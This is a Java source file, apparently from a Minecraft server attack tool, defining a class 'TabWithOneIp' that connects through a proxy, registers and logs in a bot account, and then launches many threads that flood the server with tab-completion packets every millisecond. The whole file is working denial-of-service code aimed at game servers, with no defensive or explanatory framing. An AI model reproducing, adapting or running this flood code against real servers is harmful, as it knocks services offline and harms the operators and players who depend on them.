package me.alikomi.endminecraft.tasks.attack;

import me.alikomi.endminecraft.utils.Util;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerTabCompletePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import java.net.InetSocketAddress;
import java.net.Proxy;


public class TabWithOneIp extends Util {

    private static String ip;
    private static int port;
    private static int thread;
    private static String username;
    private static Proxy.Type type;
    private static String pip;
    private static int pport;

    public TabWithOneIp(String ip, int port, int thread, String username, Proxy.Type type, String pip, int pport) {
        this.ip = ip;
        this.port = port;
        this.thread = thread;
        this.username = username;
        this.type = type;
        this.pip = pip;
        this.pport = pport;
    }

    public void startAttack() {
        MinecraftProtocol protocol = new MinecraftProtocol(username);
        Client mc = new Client(ip, port, protocol, new TcpSessionFactory(new Proxy(type, new InetSocketAddress(pip, pport))));
        mc.getSession().addListener(new SessionListener() {
            @Override
            public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                if (packetReceivedEvent.getPacket() instanceof ServerJoinGamePacket) {
                    mc.getSession().send(new ClientChatPacket("/register qwnmopzx123 qwnmopzx123"));
                    mc.getSession().send(new ClientChatPacket("/login qwnmopzx123"));

                    for (int i = 0; i < thread; i++) {
                        new Thread(() -> {
                            while (mc.getSession().isConnected()) {
                                mc.getSession().send(new ClientTabCompletePacket("/"));
                                try {
                                    Thread.sleep(1);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }
                            }
                        }).start();
                    }
                }
                if (packetReceivedEvent.getPacket() instanceof ServerTabCompletePacket) {
                    log("qwq");
                }
            }

            @Override
            public void packetSent(PacketSentEvent packetSentEvent) {

            }

            @Override
            public void connected(ConnectedEvent connectedEvent) {

            }

            @Override
            public void disconnecting(DisconnectingEvent disconnectingEvent) {

            }

            @Override
            public void disconnected(DisconnectedEvent disconnectedEvent) {

            }
        });
        mc.getSession().connect();
    }


}
